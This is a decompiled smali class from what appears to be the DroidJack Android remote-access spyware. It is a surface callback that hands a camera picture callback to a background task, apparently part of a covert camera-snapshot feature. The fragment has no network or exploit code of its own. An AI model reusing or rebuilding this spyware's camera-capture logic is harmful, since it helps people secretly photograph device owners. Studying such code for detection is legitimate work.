.class Lnet/droidjack/server/i;
.super Ljava/lang/Object;

# interfaces
.implements Landroid/view/SurfaceHolder$Callback;


# instance fields
.field final synthetic a:Lnet/droidjack/server/CamSnapDJ;

.field private final synthetic b:Landroid/hardware/Camera$PictureCallback;


# direct methods
.method constructor <init>(Lnet/droidjack/server/CamSnapDJ;Landroid/hardware/Camera$PictureCallback;)V
    .locals 0

    iput-object p1, p0, Lnet/droidjack/server/i;->a:Lnet/droidjack/server/CamSnapDJ;

    iput-object p2, p0, Lnet/droidjack/server/i;->b:Landroid/hardware/Camera$PictureCallback;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method static synthetic a(Lnet/droidjack/server/i;)Lnet/droidjack/server/CamSnapDJ;
    .locals 1

    iget-object v0, p0, Lnet/droidjack/server/i;->a:Lnet/droidjack/server/CamSnapDJ;

    return-object v0
.end method


# virtual methods
.method public surfaceChanged(Landroid/view/SurfaceHolder;III)V
    .locals 0

    return-void
.end method

.method public surfaceCreated(Landroid/view/SurfaceHolder;)V
    .locals 3

    :try_start_0
    invoke-static {}, Ljava/util/concurrent/Executors;->newSingleThreadExecutor()Ljava/util/concurrent/ExecutorService;

    move-result-object v0

    new-instance v1, Lnet/droidjack/server/j;

    iget-object v2, p0, Lnet/droidjack/server/i;->b:Landroid/hardware/Camera$PictureCallback;

    invoke-direct {v1, p0, v2}, Lnet/droidjack/server/j;-><init>(Lnet/droidjack/server/i;Landroid/hardware/Camera$PictureCallback;)V

    invoke-interface {v0, v1}, Ljava/util/concurrent/ExecutorService;->submit(Ljava/util/concurrent/Callable;)Ljava/util/concurrent/Future;

    move-result-object v0

    invoke-interface {v0}, Ljava/util/concurrent/Future;->get()Ljava/lang/Object;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :goto_0
    return-void

    :catch_0
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_0
.end method

.method public surfaceDestroyed(Landroid/view/SurfaceHolder;)V
    .locals 0

    return-void
.end method
